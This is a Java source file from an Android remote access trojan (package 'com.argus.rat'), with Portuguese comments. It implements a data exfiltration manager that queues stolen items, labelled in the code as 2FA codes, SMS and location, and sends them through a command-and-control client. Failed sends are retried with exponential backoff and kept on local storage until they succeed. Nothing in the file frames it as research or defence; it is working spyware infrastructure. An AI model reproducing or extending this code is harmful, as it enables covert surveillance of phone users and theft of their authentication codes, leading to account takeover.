package com.argus.rat;

import android.content.Context;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingDeque;
import java.util.concurrent.TimeUnit;

/**
 * Gerenciador de fila de exfiltração de dados
 * Implementa retry automático com exponential backoff
 * Priorização de dados (critical/normal/low)
 * Persistência local para dados não enviados
 */
public class DataExfiltrationManager {
    private static final String TAG = "DataExfiltrationManager";
    private static DataExfiltrationManager instance;
    
    private final Context context;
    private final Gson gson;
    private final LinkedBlockingDeque<DataItem> dataQueue;
    private Thread workerThread;
    private boolean isRunning;
    
    // Configurações de retry
    private static final int MAX_RETRIES = 5;
    private static final long INITIAL_RETRY_DELAY = 5000; // 5 segundos
    private static final long MAX_RETRY_DELAY = 300000; // 5 minutos
    
    private DataExfiltrationManager(Context context) {
        this.context = context.getApplicationContext();
        this.gson = new Gson();
        this.dataQueue = new LinkedBlockingDeque<>();
        this.isRunning = false;
        
        Log.i(TAG, "DataExfiltrationManager criado");
    }
    
    public static synchronized DataExfiltrationManager getInstance(Context context) {
        if (instance == null) {
            instance = new DataExfiltrationManager(context);
        }
        return instance;
    }
    
    /**
     * Inicia o processamento da fila
     */
    public void start() {
        if (isRunning) {
            Log.w(TAG, "DataExfiltrationManager já está rodando");
            return;
        }
        
        isRunning = true;
        
        workerThread = new Thread(new Worker());
        workerThread.setName("DataExfiltrationWorker");
        workerThread.start();
        
        Log.i(TAG, "DataExfiltrationManager iniciado");
    }
    
    /**
     * Para o processamento da fila
     */
    public void stop() {
        isRunning = false;
        
        if (workerThread != null) {
            workerThread.interrupt();
            try {
                workerThread.join(5000);
            } catch (InterruptedException e) {
                Log.e(TAG, "Erro ao parar worker thread", e);
            }
        }
        
        // Salvar dados pendentes localmente
        savePendingDataLocally();
        
        Log.i(TAG, "DataExfiltrationManager parado");
    }
    
    /**
     * Adiciona dados à fila para envio
     */
    public void queueData(String dataType, String jsonData) {
        queueData(dataType, jsonData, Priority.NORMAL);
    }
    
    /**
     * Adiciona dados à fila com prioridade específica
     */
    public void queueData(String dataType, String jsonData, Priority priority) {
        try {
            DataItem item = new DataItem(dataType, jsonData, priority);
            
            // Inserir baseado em prioridade
            if (priority == Priority.CRITICAL) {
                // Adicionar no início da fila
                dataQueue.putFirst(item);
            } else {
                dataQueue.put(item);
            }
            
            Log.d(TAG, "Dados adicionados à fila: " + dataType + " (Priority: " + priority + ")");
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao adicionar dados à fila", e);
        }
    }
    
    /**
     * Processa manualmente a fila (chamado externamente)
     */
    public void processQueue() {
        Log.d(TAG, "Processamento manual da fila solicitado. Tamanho atual: " + getQueueSize());
        // A fila já está sendo processada pela worker thread
        // Este método existe apenas para compatibilidade
    }
    
    /**
     * Retorna tamanho da fila
     */
    public int getQueueSize() {
        return dataQueue.size();
    }
    
    /**
     * Limpa a fila
     */
    public void clearQueue() {
        dataQueue.clear();
        Log.i(TAG, "Fila limpa");
    }
    
    /**
     * Salva dados pendentes localmente
     */
    private void savePendingDataLocally() {
        try {
            int savedCount = 0;
            
            while (!dataQueue.isEmpty()) {
                DataItem item = dataQueue.poll();
                if (item != null) {
                    String filename = "pending_" + item.dataType + "_" + System.currentTimeMillis() + ".json";
                    
                    JsonObject data = new JsonObject();
                    data.addProperty("type", item.dataType);
                    data.addProperty("data", item.jsonData);
                    data.addProperty("priority", item.priority.name());
                    data.addProperty("timestamp", item.timestamp);
                    
                    // Salvar em arquivo local
                    java.io.FileOutputStream fos = context.openFileOutput(filename, Context.MODE_PRIVATE);
                    fos.write(gson.toJson(data).getBytes());
                    fos.close();
                    
                    savedCount++;
                }
            }
            
            if (savedCount > 0) {
                Log.i(TAG, "Dados pendentes salvos localmente: " + savedCount + " itens");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao salvar dados pendentes", e);
        }
    }
    
    /**
     * Carrega dados pendentes salvos localmente
     */
    public void loadPendingData() {
        try {
            String[] files = context.fileList();
            int loadedCount = 0;
            
            for (String filename : files) {
                if (filename.startsWith("pending_")) {
                    try {
                        java.io.FileInputStream fis = context.openFileInput(filename);
                        byte[] buffer = new byte[fis.available()];
                        fis.read(buffer);
                        fis.close();
                        
                        String jsonStr = new String(buffer);
                        JsonObject data = gson.fromJson(jsonStr, JsonObject.class);
                        
                        String dataType = data.get("type").getAsString();
                        String jsonData = data.get("data").getAsString();
                        Priority priority = Priority.valueOf(data.get("priority").getAsString());
                        
                        queueData(dataType, jsonData, priority);
                        
                        // Deletar arquivo após carregar
                        context.deleteFile(filename);
                        
                        loadedCount++;
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao carregar arquivo pendente: " + filename, e);
                    }
                }
            }
            
            if (loadedCount > 0) {
                Log.i(TAG, "Dados pendentes carregados: " + loadedCount + " itens");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao carregar dados pendentes", e);
        }
    }
    
    // ==================== CLASSES INTERNAS ====================
    
    /**
     * Item de dados na fila
     */
    private static class DataItem {
        String dataType;
        String jsonData;
        Priority priority;
        long timestamp;
        int retries;
        
        DataItem(String dataType, String jsonData, Priority priority) {
            this.dataType = dataType;
            this.jsonData = jsonData;
            this.priority = priority;
            this.timestamp = System.currentTimeMillis();
            this.retries = 0;
        }
    }
    
    /**
     * Prioridades de dados
     */
    public enum Priority {
        CRITICAL,  // Comandos importantes, 2FA codes
        NORMAL,    // SMS, localização
        LOW        // Logs, estatísticas
    }
    
    /**
     * Worker thread que processa a fila
     */
    private class Worker implements Runnable {
        @Override
        public void run() {
            Log.i(TAG, "Worker thread iniciada");
            
            // Carregar dados pendentes ao iniciar
            loadPendingData();
            
            while (isRunning && !Thread.interrupted()) {
                try {
                    // Pegar próximo item da fila (bloqueia se vazio)
                    DataItem item = dataQueue.poll(10, TimeUnit.SECONDS);
                    
                    if (item != null) {
                        processDataItem(item);
                    }
                    
                } catch (InterruptedException e) {
                    Log.w(TAG, "Worker thread interrompida");
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Erro no worker thread", e);
                }
            }
            
            Log.i(TAG, "Worker thread finalizada");
        }
        
        /**
         * Processa um item de dados
         */
        private void processDataItem(DataItem item) {
            Log.d(TAG, "Processando item: " + item.dataType + " (Tentativa " + (item.retries + 1) + ")");
            
            try {
                // Enviar via C2Client
                C2Client c2Client = C2Client.getInstance(context);
                
                final DataItem currentItem = item;
                
                c2Client.exfiltrateData(item.dataType, item.jsonData, new C2Client.ExfiltrationCallback() {
                    @Override
                    public void onSuccess() {
                        Log.i(TAG, "Item processado com sucesso: " + currentItem.dataType);
                        // Item foi enviado com sucesso, não precisa fazer nada
                    }
                    
                    @Override
                    public void onError(Exception e) {
                        Log.e(TAG, "Erro ao processar item: " + currentItem.dataType, e);
                        
                        // Implementar retry com exponential backoff
                        currentItem.retries++;
                        
                        if (currentItem.retries < MAX_RETRIES) {
                            // Calcular delay de retry (exponential backoff)
                            long delay = Math.min(
                                INITIAL_RETRY_DELAY * (long) Math.pow(2, currentItem.retries),
                                MAX_RETRY_DELAY
                            );
                            
                            Log.w(TAG, "Recolocando item na fila após " + delay + "ms (Tentativa " + 
                                  currentItem.retries + "/" + MAX_RETRIES + ")");
                            
                            // Agendar retry
                            new Thread(() -> {
                                try {
                                    Thread.sleep(delay);
                                    dataQueue.put(currentItem);
                                } catch (InterruptedException ie) {
                                    Log.e(TAG, "Erro ao reagendar item", ie);
                                }
                            }).start();
                            
                        } else {
                            Log.e(TAG, "Item descartado após " + MAX_RETRIES + " tentativas: " + 
                                  currentItem.dataType);
                            
                            // Salvar localmente para não perder
                            saveFailedItem(currentItem);
                        }
                    }
                });
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao processar item", e);
                
                // Salvar localmente em caso de erro
                if (item.retries >= MAX_RETRIES) {
                    saveFailedItem(item);
                }
            }
        }
        
        /**
         * Salva item que falhou após todos os retries
         */
        private void saveFailedItem(DataItem item) {
            try {
                String filename = "failed_" + item.dataType + "_" + System.currentTimeMillis() + ".json";
                
                JsonObject data = new JsonObject();
                data.addProperty("type", item.dataType);
                data.addProperty("data", item.jsonData);
                data.addProperty("priority", item.priority.name());
                data.addProperty("timestamp", item.timestamp);
                data.addProperty("retries", item.retries);
                
                java.io.FileOutputStream fos = context.openFileOutput(filename, Context.MODE_PRIVATE);
                fos.write(gson.toJson(data).getBytes());
                fos.close();
                
                Log.i(TAG, "Item falhado salvo localmente: " + filename);
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao salvar item falhado", e);
            }
        }
    }
}

